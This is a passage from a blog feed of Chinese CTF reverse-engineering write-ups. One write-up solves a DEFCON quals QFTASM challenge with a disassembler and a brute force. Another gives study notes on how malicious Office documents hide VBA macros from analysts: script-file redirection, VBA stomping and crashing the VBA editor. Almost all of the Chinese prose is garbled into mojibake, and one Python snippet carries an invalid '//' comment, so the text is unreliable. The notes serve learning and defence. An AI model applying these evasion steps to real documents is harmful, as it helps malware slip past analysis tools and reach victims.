class="line">000000000001001010100000000001001010100000000001001110011</span><br><span class="line">000000000001001110010101010110001110100000000000000010110</span><br><span class="line">000000000001001100100000000001001100100000000001001110011</span><br><span class="line">000000000000000000011111111111111100011111111111111110001</span><br><span class="line">000000000000000000000000000000000000000000000000000000001</span><br><span class="line">000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>æ ¹æ®</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-15%20005952.png" alt="å±å¹•æˆªå›¾ 2024-09-15 005952"></p><p>å’Œä¸Šé¢çš„è§„åˆ™ï¼Œhex2asm.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bitstring <span class="keyword">import</span> BitArray</span><br><span class="line"></span><br><span class="line">opcodes = &#123;<span class="string">&#x27;0000&#x27;</span>: <span class="string">&#x27;MNZ&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0001&#x27;</span>: <span class="string">&#x27;MLZ&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0010&#x27;</span>: <span class="string">&#x27;ADD&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0011&#x27;</span>: <span class="string">&#x27;SUB&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0100&#x27;</span>: <span class="string">&#x27;AND&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0101&#x27;</span>: <span class="string">&#x27;OR&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0110&#x27;</span>: <span class="string">&#x27;XOR&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0111&#x27;</span>: <span class="string">&#x27;ANT&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;1000&#x27;</span>: <span class="string">&#x27;SL&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;1001&#x27;</span>: <span class="string">&#x27;SRL&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;1010&#x27;</span>: <span class="string">&#x27;SRA&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">modes = &#123;<span class="string">&#x27;00&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;01&#x27;</span>: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;10&#x27;</span>: <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;11&#x27;</span>: <span class="string">&#x27;C&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">code</span>):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    count = <span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> code[::<span class="number">1</span>]:</span><br><span class="line">        opcode = opcodes[l[-<span class="number">4</span>:]]</span><br><span class="line">        arg1 = l[<span class="number">18</span>*<span class="number">2</span>-<span class="number">1</span>:-<span class="number">4</span>]</span><br><span class="line">        arg2 = l[<span class="number">17</span>:<span class="number">18</span>*<span class="number">2</span>-<span class="number">1</span>]</span><br><span class="line">        arg3 = l[:<span class="number">17</span>]</span><br><span class="line">        mode1 = modes[arg1[:<span class="number">2</span>]]</span><br><span class="line">        arg1 = <span class="built_in">str</span>(BitArray(<span class="built_in">bin</span>=arg1[<span class="number">2</span>:]).<span class="built_in">int</span>)</span><br><span class="line">        mode2 = modes[arg2[:<span class="number">2</span>]]</span><br><span class="line">        arg2 = <span class="built_in">str</span>(BitArray(<span class="built_in">bin</span>=arg2[<span class="number">2</span>:]).uint) //è¿™é‡Œè½¬æ— ç¬¦å·æ•°</span><br><span class="line">        mode3 = modes[arg3[:<span class="number">2</span>]]</span><br><span class="line">        arg3 = <span class="built_in">str</span>(BitArray(<span class="built_in">bin</span>=arg3[<span class="number">2</span>:]).uint)</span><br><span class="line">        out += <span class="built_in">str</span>(count) + <span class="string">&#x27;. &#x27;</span> + opcode + <span class="string">&#x27; &#x27;</span> + mode1 + arg1 + <span class="string">&#x27; &#x27;</span> + mode2 + arg2 + <span class="string">&#x27; &#x27;</span> + mode3 + arg3 +<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">code = []</span><br><span class="line">asm = parse(code)</span><br><span class="line"><span class="built_in">print</span>(asm)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œï¼Œvalueå€¼ä¸è€ƒè™‘è´Ÿæ•°ï¼Œæ‰€ä»¥ä»¥æ— ç¬¦å·æ•°è½¬åŒ–</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">0. MNZ 0 0 0</span><br><span class="line">1. MLZ -1 44 43</span><br><span class="line">2. XOR 0 0 2</span><br><span class="line">3. MLZ -1 25971 2</span><br><span class="line">4. MLZ -1 14554 3</span><br><span class="line">5. MLZ -1 22445 4</span><br><span class="line">6. MLZ -1 25411 5</span><br><span class="line">7. MLZ -1 3743 6</span><br><span class="line">8. MLZ -1 13391 7</span><br><span class="line">9. MLZ -1 12059 8</span><br><span class="line">10. MLZ -1 2554 9</span><br><span class="line">11. MLZ -1 15823 10</span><br><span class="line">12. MLZ -1 5921 11</span><br><span class="line">13. MLZ -1 18009 12</span><br><span class="line">14. MLZ -1 14823 13</span><br><span class="line">15. MLZ -1 4757 14</span><br><span class="line">16. MLZ -1 7754 15</span><br><span class="line">17. MLZ -1 22480 16</span><br><span class="line">18. MLZ -1 8371 17</span><br><span class="line">19. MLZ -1 12418 18</span><br><span class="line">20. MLZ -1 22738 19</span><br><span class="line">21. MLZ -1 16499 20</span><br><span class="line">22. MLZ -1 7132 21</span><br><span class="line">23. MLZ -1 22793 22</span><br><span class="line">24. MLZ -1 22307 23</span><br><span class="line">25. MLZ -1 12485 24</span><br><span class="line">26. MLZ -1 7936 25</span><br><span class="line">27. MLZ -1 26630 26</span><br><span class="line">28. MLZ -1 15483 27</span><br><span class="line">29. MLZ -1 6471 28</span><br><span class="line">30. MLZ -1 1806 29</span><br><span class="line">31. MLZ -1 22705 30</span><br><span class="line">32. MLZ -1 25019 31</span><br><span class="line">33. MLZ -1 16442 32</span><br><span class="line">34. MLZ -1 5145 33</span><br><span class="line">35. MLZ -1 15593 34</span><br><span class="line">36. MLZ -1 23867 35</span><br><span class="line">37. MLZ -1 23738 36</span><br><span class="line">38. MLZ -1 14086 37</span><br><span class="line">39. MLZ -1 23123 38</span><br><span class="line">40. MLZ -1 0 39</span><br><span class="line">41. XOR A1 38357 39</span><br><span class="line">42. SUB A39 A2 2</span><br><span class="line">43. XOR A1 51518 39</span><br><span class="line">44. SUB A39 A3 3</span><br><span class="line">45. XOR A1 42987 39</span><br><span class="line">46. SUB A39 A4 4</span><br><span class="line">47. XOR A1 37801 39</span><br><span class="line">48. SUB A39 A5 5</span><br><span class="line">49. XOR A1 65311 39</span><br><span class="line">50. SUB A39 A6 6</span><br><span class="line">51. XOR A1 50346 39</span><br><span class="line">52. SUB A39 A7 7</span><br><span class="line">53. XOR A1 57197 39</span><br><span class="line">54. SUB A39 A8 8</span><br><span class="line">55. XOR A1 64121 39</span><br><span class="line">56. SUB A39 A9 9</span><br><span class="line">57. XOR A1 52768 39</span><br><span class="line">58. SUB A39 A10 10</span><br><span class="line">59. XOR A1 59293 39</span><br><span class="line">60. SUB A39 A11 11</span><br><span class="line">61. XOR A1 46811 39</span><br><span class="line">62. SUB A39 A12 12</span><br><span class="line">63. XOR A1 51793 39</span><br><span class="line">64. SUB A39 A13 13</span><br><span class="line">65. XOR A1 58134 39</span><br><span class="line">66. SUB A39 A14 14</span><br><span class="line">67. XOR A1 61092 39</span><br><span class="line">68. SUB A39 A15 15</span><br><span class="line">69. XOR A1 43041 39</span><br><span class="line">70. SUB A39 A16 16</span><br><span class="line">71. XOR A1 53519 39</span><br><span class="line">72. SUB A39 A17 17</span><br><span class="line">73. XOR A1 49398 39</span><br><span class="line">74. SUB A39 A18 18</span><br><span class="line">75. XOR A1 43302 39</span><br><span class="line">76. SUB A39 A19 19</span><br><span class="line">77. XOR A1 45253 39</span><br><span class="line">78. SUB A39 A20 20</span><br><span class="line">79. XOR A1 60482 39</span><br><span class="line">80. SUB A39 A21 21</span><br><span class="line">81. XOR A1 43375 39</span><br><span class="line">82. SUB A39 A22 22</span><br><span class="line">83. XOR A1 42895 39</span><br><span class="line">84. SUB A39 A23 23</span><br><span class="line">85. XOR A1 49440 39</span><br><span class="line">86. SUB A39 A24 24</span><br><span class="line">87. XOR A1 61298 39</span><br><span class="line">88. SUB A39 A25 25</span><br><span class="line">89. XOR A1 39026 39</span><br><span class="line">90. SUB A39 A26 26</span><br><span class="line">91. XOR A1 52477 39</span><br><span class="line">92. SUB A39 A27 27</span><br><span class="line">93. XOR A1 59810 39</span><br><span class="line">94. SUB A39 A28 28</span><br><span class="line">95. XOR A1 63354 39</span><br><span class="line">96. SUB A39 A29 29</span><br><span class="line">97. XOR A1 43325 39</span><br><span class="line">98. SUB A39 A30 30</span><br><span class="line">99. XOR A1 37437 39</span><br><span class="line">100. SUB A39 A31 31</span><br><span class="line">101. XOR A1 45240 39</span><br><span class="line">102. SUB A39 A32 32</span><br><span class="line">103. XOR A1 58524 39</span><br><span class="line">104. SUB A39 A33 33</span><br><span class="line">105. XOR A1 52575 39</span><br><span class="line">106. SUB A39 A34 34</span><br><span class="line">107. XOR A1 44477 39</span><br><span class="line">108. SUB A39 A35 35</span><br><span class="line">109. XOR A1 44326 39</span><br><span class="line">110. SUB A39 A36 36</span><br><span class="line">111. XOR A1 51043 39</span><br><span class="line">112. SUB A39 A37 37</span><br><span class="line">113. XOR A1 43719 39</span><br><span class="line">114. SUB A39 A38 38</span><br><span class="line">115. MLZ -1 65534 0</span><br><span class="line">116. MLZ 0 0 0</span><br><span class="line">117. MNZ 0 0 0</span><br></pre></td></tr></table></figure><p>ä»£ç é€»è¾‘è¿˜æ˜¯å¾ˆæ˜æ˜¾çš„â€”â€”</p><p>åˆå§‹åŒ–ï¼Œæ”¾ä¸€å †æ•°å­—åœ¨2åˆ°38ï¼ŒA1ä¾æ¬¡å’Œå¦ä¸€å †æ•°å­—å¼‚æˆ–åå‡å»Aiä½ç½®æ•°æ”¾åœ¨iä½</p><p>A1ä¸38357å¼‚æˆ–åæ”¾åœ¨39ä½ï¼Œ[A39]å‡[A2]æ”¾åœ¨A2ï¼Œ[2]ä»25971å˜æˆ12386</p><p>ï¼ˆå¼‚æˆ–å…·æœ‰å¯¹ç§°æ€§ï¼Œå¾—A1ä¸º-65536)</p><p>QFTASM Interpreterâ€”â€”<a href="https://darthnithin.github.io/qftasm-interpreter/qftasm.html">https://darthnithin.github.io/qftasm-interpreter/qftasm.html</a></p><p>è·‘ä¸€ä¸‹ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰â€”â€”æ€ä¹ˆç»˜ä¸–å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒA1ä½¿ç”¨çš„æœ€å¤šï¼Œä½†æ˜¯æ²¡æœ‰åˆå§‹å€¼â€”â€”è¦çˆ†ç ´äº†ï¼ˆå·²çŸ¥å¤´æ˜¯OOOï¼ŒOæ˜¯79ï¼‰</p><p>çŸ¥é“ç¬¬ä¸€ä½æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">65536</span>):</span><br><span class="line">    value = (i^<span class="number">38357</span>)</span><br><span class="line">    <span class="keyword">if</span> (value)-<span class="number">25971</span> == <span class="number">79</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"><span class="comment"># 61463</span></span><br></pre></td></tr></table></figure><p>æŠŠä¸Šé¢æ±‡ç¼–å¡ä¸€è¡Œâ€”â€”3. MLZ -1 61463 1ï¼Œå†æ”¾ç¼–è¯‘å™¨è·‘ä¸€ä¸‹ï¼Œéå¸¸ç¾ä¸½çš„asciiå‡ºç°äº†â€”â€”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">79</span>,<span class="number">79</span>,<span class="number">79</span>,<span class="number">123</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">95</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">102</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">121</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">95</span>,<span class="number">121</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">95</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">110</span>,<span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end= <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#OOO&#123;in_this_life___youre_on_your_own&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DEFCON-quals-Rev-ncHEVjuw-txt&quot;&gt;&lt;a href=&quot;#DEFCON-quals-Rev-ncHEVjuw-txt&quot; class=&quot;headerlink&quot; title=&quot;DEFCON quals | Rev  ncHEVjuw.txt&quot;&gt;</summary>
      
    
    
    
    
    <category term="Reverse Golly DEFCON" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/Reverse-Golly-DEFCON/"/>
    
  </entry>
  
  <entry>
    <title>ç¾ŠåŸæ¯2024 | Reverse_docCrack</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/09/04/%F0%9F%90%8F%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%20%20Reverse/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/09/04/%F0%9F%90%8F%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%20%20Reverse/</id>
    <published>2024-09-03T16:00:00.000Z</published>
    <updated>2024-09-16T07:53:19.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ğŸç¾ŠåŸæ¯2024-Reverse-docCrack"><a href="#ğŸç¾ŠåŸæ¯2024-Reverse-docCrack" class="headerlink" title="ğŸç¾ŠåŸæ¯2024 | Reverse_docCrack"></a>ğŸç¾ŠåŸæ¯2024 | Reverse_docCrack</h1><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://github.com/CTF-Archives/2024-YCB-Undergraduate/releases/download/v1.0/Reverse-docCrack.zip">Reverse-docCrack</a></p><p>ä¸€é“å¾ˆæ„å¤–çš„é€†å‘é¢˜ç›®ï¼Œæ‰“å¼€ä¸€ç¬é—´æ‡µäº†ä¸€ä¸‹ã€‚ç»†ç»†æ€è€ƒï¼Œä¹‹å‰æœ‰ç®€å•äº†è§£è¿‡å®ç—…æ¯’ä¹‹ç±»çš„ã€‚æ„Ÿè§‰æ˜¯ä¸€é“å¾ˆæœ‰æ„æ€çš„é¢˜ç›®ï¼Œæ‰€ä»¥æ‰“ç®—å¥½å¥½è®°å½•ä¸€ä¸‹è¿™é“é¢˜ã€‚</p><p>è®°å¾—ä¹‹å‰<a href="https://blog.xinshi.fun/wp/yangcheng-2024/#reverse-doccrack">LilRanå¸ˆå‚…å‘è¿‡è¯¥ç¯‡çš„é¢˜è§£</a>ï¼Œqqç©ºé—´å¾€ä¸‹æ»‘ä¸€æ»‘ï¼Œå‘ç°ä¹‹å‰æœ‰æåˆ°è¿‡ç±»ä¼¼çš„å‡ºé¢˜æ–¹æ³•ï¼ˆVBAï¼‰ï¼ˆçœ‹æ¥åšçš„é¢˜å®åœ¨æ˜¯å¤ªå°‘äº†â€”â€”ï¼‰ï¼Œæœç„¶å…‰çœ‹å¸ˆå‚…ä»¬çš„ç©ºé—´å°±èƒ½å­¦åˆ°å¥½å¤šä¸œè¥¿ã€‚</p><p>ä»¥ä¸‹æ˜¯å­¦ä¹ ç¬”è®°â€”â€”</p><h2 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h2><p>å‚è€ƒæ–‡ç« â€”â€”[VBAè„šæœ¬æ–‡ä»¶é‡å®šå‘](<a href="https://mp.weixin.qq.com/s/QbX84NmVXNdV42W4PkNl_A">VBAè„šæœ¬æ–‡ä»¶é‡å®šå‘ (qq.com)</a>)ã€[VBAéšè—æŠ€æœ¯stomping](<a href="https://mp.weixin.qq.com/s/VmVdvD9c6p9Hdo9MZiIyZg">VBAéšè—æŠ€æœ¯stomping (qq.com)</a>) ã€[VBAè„šæœ¬ç»ˆç« ç¼–è¯‘å™¨å´©æºƒ](<a href="https://mp.weixin.qq.com/s/d2mULeMn9dft68hzZC3-yQ">VBAè„šæœ¬ç»ˆç« ç¼–è¯‘å™¨å´©æºƒ (qq.com)</a>)</p><h3 id="VBAå®ä»£ç "><a href="#VBAå®ä»£ç " class="headerlink" title="VBAå®ä»£ç "></a>VBAå®ä»£ç </h3><p>å°†Officeæ–‡æ¡£ä¸­åµŒå…¥ä»¥VBA(Visual Basic for Applications)ç¼–å†™çš„å®ä»£ç è„šæœ¬ï¼Œå½“è¿è¡ŒOfficeæ–‡æ¡£æ—¶ï¼Œä¾¿å¯ä»¥æ‰§è¡Œå„ç§å‘½ä»¤ã€‚</p><h3 id="VBAè„šæœ¬æ–‡ä»¶é‡å®šå‘"><a href="#VBAè„šæœ¬æ–‡ä»¶é‡å®šå‘" class="headerlink" title="VBAè„šæœ¬æ–‡ä»¶é‡å®šå‘"></a>VBAè„šæœ¬æ–‡ä»¶é‡å®šå‘</h3><p>ä¸ºé˜²æ­¢åˆ†æäººå‘˜ç›´æ¥æ‰“å¼€å®ç¼–è¾‘å™¨æŸ¥çœ‹å®çš„æºç ï¼Œåˆ†æè„šæœ¬åŠŸèƒ½ï¼Œå¾®è½¯æä¾›çš„å·¥ç¨‹åŠ å¯†å·¥å…·ä»èƒ½è¢«æ›¿æ¢è„šæœ¬ä¸­çš„åŠ å¯†æ¨¡å—è¿›è¡ŒéªŒè¯ç»•è¿‡ï¼Œæ‰€ä»¥VBAè„šæœ¬æ–‡ä»¶é‡å®šå‘å¯¹è„šæœ¬é»˜è®¤æ–‡ä»¶vbaProject.binè¿›è¡Œæ›¿æ¢ï¼Œåœ¨æ‰“å¼€æ–‡æœ¬æ—¶åŠ è½½å…¶ä»–æ–‡ä»¶ï¼Œå¢åŠ åˆ†æè€…çš„åˆ†æå¤æ‚ç¨‹åº¦ã€‚</p><p>æ­¤å¤„çš„è„šæœ¬æ–‡ä»¶é‡å®šå‘ï¼Œæ˜¯å°†vbaProject.binè¿›è¡Œä¼ªè£…ï¼Œæ¯”å¦‚styIes.xmIï¼ˆç”¨å¤§å†™iæ›¿æ¢å°å†™Lï¼‰ï¼Œä¹‹åä¿®æ”¹ç›¸å…³çš„ä¸‰ä¸ªæ–‡ä»¶ä»¥ä¿è¯ç¨‹åºæ­£å¸¸è¿›è¡Œâ€”â€”</p><p><strong>æ ¹ç›®å½•çš„[Content_Types].xmlï¼š</strong></p><p>æ·»åŠ ä¸€ä¸ªæ ‡ç­¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Default Extension=&quot;xmI&quot; ContentType=&quot;application/vnd.ms-office.vbaProject&quot;/&gt;</span><br></pre></td></tr></table></figure><p><strong>\word_relsæ–‡ä»¶å¤¹çš„</strong></p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240903225844894.png" alt="image-20240903225844894" style="zoom:50%;" /><p>ä¿®æ”¹vbaProject.bin.rlesæ–‡ä»¶çš„åå­—ä¸ºstyIes.xmI.rels</p><p>å°†document.xml.relsæ–‡ä»¶ä¸­TargetæŒ‡å‘æ”¹ä¸ºstyIes.xmI (éƒ½æ˜¯å¤§å†™i)</p><h3 id="VBAéšè—æŠ€æœ¯stomping"><a href="#VBAéšè—æŠ€æœ¯stomping" class="headerlink" title="VBAéšè—æŠ€æœ¯stomping"></a>VBAéšè—æŠ€æœ¯stomping</h3><p>è„šæœ¬é‡å®šå‘æŠ€æœ¯æ— æ³•ç»•è¿‡Microsoft OLEåˆ†æå·¥å…·çš„æ£€æµ‹ã€‚</p><p>stomping å¯ä»¥ç ´å Microsoft Office æ–‡æ¡£ä¸­çš„ VBA æºä»£ç ï¼Œå¯¹Microsoft OLEåˆ†æå·¥å…·è¿›è¡Œæ¬ºéª—ï¼Œå¹²æ‰°å…¶åˆ†æç»“æœã€‚</p><p><strong>OLEåˆ†æå·¥å…·</strong>æ˜¯é€šè¿‡æœç´¢â€Attributâ€è¿™ä¸ªç‰¹å¾æ¥å®šä½å®çš„ä½ç½®ã€‚</p><blockquote><p>VBAäºŒè¿›åˆ¶è„šæœ¬æ–‡ä»¶ä¸­å³åŒ…å«äº†æºç å­—ç¬¦ï¼ŒåˆåŒ…å«äº†P-Codeï¼ŒVBAä¸­çš„P-Codeï¼Œå…¶æœ¬è´¨æ˜¯å¯¹æºç å­—ç¬¦çš„ç¼–è¯‘å‹ç¼©ï¼Œå› æ­¤å®ç°çš„åŠŸèƒ½æ˜¯ç›¸åŒçš„ï¼Œå³VBAäºŒè¿›åˆ¶è„šæœ¬ä¸­å­˜åœ¨ä¸¤ä»½åŠŸèƒ½ä¸€è‡´çš„ä»£ç ï¼Œåªæ˜¯å­˜åœ¨çš„å½¢å¼ä¸åŒï¼Œè€Œoletoolsä¸ä¼šå»è§£æP-Codeã€‚</p><p>å¦‚æœæ»¡è¶³è„šæœ¬ç¼–è¯‘ç¯å¢ƒå’Œæ‰§è¡Œç¯å¢ƒçš„VBAç‰ˆæœ¬ä¸€è‡´ï¼Œå¯ä»¥ä¿®æ”¹æºç éƒ¨åˆ†ï¼Œè¿™æ ·oletoolsè§£æçš„ç»“æœå°±æ˜¯æˆ‘ä»¬ä¿®æ”¹åçš„ä»£ç ï¼Œè€Œè§£é‡Šå™¨ä¾æ—§ä¼šæ‰§è¡Œæ—§ä»£ç </p></blockquote><h3 id="VBAç¼–è¯‘å™¨å´©æºƒ"><a href="#VBAç¼–è¯‘å™¨å´©æºƒ" class="headerlink" title="VBAç¼–è¯‘å™¨å´©æºƒ"></a>VBAç¼–è¯‘å™¨å´©æºƒ</h3><p>å½“è„šæœ¬ç¼–è¯‘ç¯å¢ƒå’Œæ‰§è¡Œç¯å¢ƒçš„VBAç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œç¼–è¯‘å™¨æ— æ³•æ‰“å¼€ã€‚<br>æˆ–è€…åœ¨vbaProject.binæ–‡ä»¶ä¸­ï¼Œä¿®æ”¹Module&#x3D;åçš„å€¼åˆ é™¤ï¼Œï¼ˆä¿ç•™æ¢è¡Œç¬¦0x0D,0x0Aï¼‰ï¼Œåé¢ä¿¡æ¯ä¿¡æ¯éœ€è¦å‰ç§»ï¼Œä¹Ÿå¯ä»¥ä½¿ç¼–è¯‘å™¨å´©æºƒ</p><h3 id="ä¿®å¤å´©æºƒ"><a href="#ä¿®å¤å´©æºƒ" class="headerlink" title="ä¿®å¤å´©æºƒ"></a>ä¿®å¤å´©æºƒ</h3><p>æ ¹æ®ä¸Šæ–‡æåˆ°çš„æ–¹æ³•åæ¨ï¼Œå¯ä»¥è¯•ç€ä¿®å¤VBAæ–‡ä»¶ï¼ŒæŸ¥çœ‹å´©æºƒåŸå› æ˜¯å¦æ˜¯ç”±Moduleä¿¡æ¯çš„ç¼ºå¤±å¼•èµ·çš„ï¼Œå¦‚æœæ˜¯è¯¥åŸå› ï¼Œä¿®å¤è¯¥å¤„ç¼ºå¤±çš„ä¿¡æ¯ã€‚</p><p>å¸¸è§„OFFICEæ–‡æ¡£æ–‡ä»¶ä¸­ï¼Œåœ¨wordç›®å½•ä¸‹çš„vbaData.xmlæ–‡ä»¶ä¸­å«æœ‰æ¨¡å—ä¿¡æ¯ã€‚</p><p>åœ¨[b773fa65bb375e6fe6d387f301f6bf33219189ea1d4a06762e965a9eba7de4e8]ä¸­ï¼ŒvbaData.xmlæ–‡ä»¶è¢«é‡å®šä½åˆ°iuM.dsnï¼Œå› æ­¤æˆ‘ä»¬æ‰“å¼€iuM.dsnã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°wne:name&#x3D;â€Project.Module1.AutoOpenâ€ï¼Œå…¶ä¸­Projectä»£è¡¨Projectæµï¼ŒModule1æ˜¯Moduleçš„åå­—ï¼Œç­‰äºåŒæˆ‘ä»¬è‡ªå·±ç”Ÿæˆæ–‡ä»¶çš„NewMacrosï¼Œåé—¨AutoOpenæ˜¯å‡½æ•°åã€‚</p><p>æ‰“å¼€EbDYTPZ[.]vEypmæ–‡ä»¶ï¼Œé€šè¿‡ç‰¹å¾â€&#x2F;&amp;H00000000â€œç‰¹å¾å®šä½Moduleï¼Œå¯ä»¥å‘ç°è¯¥å¤„å¹¶æ²¡æœ‰Moduleæ¨¡å—ï¼Œç¡®å®šæ”»å‡»è€…å°†è¯¥å­—æ®µæŠ¹é™¤ã€‚</p><p>å› 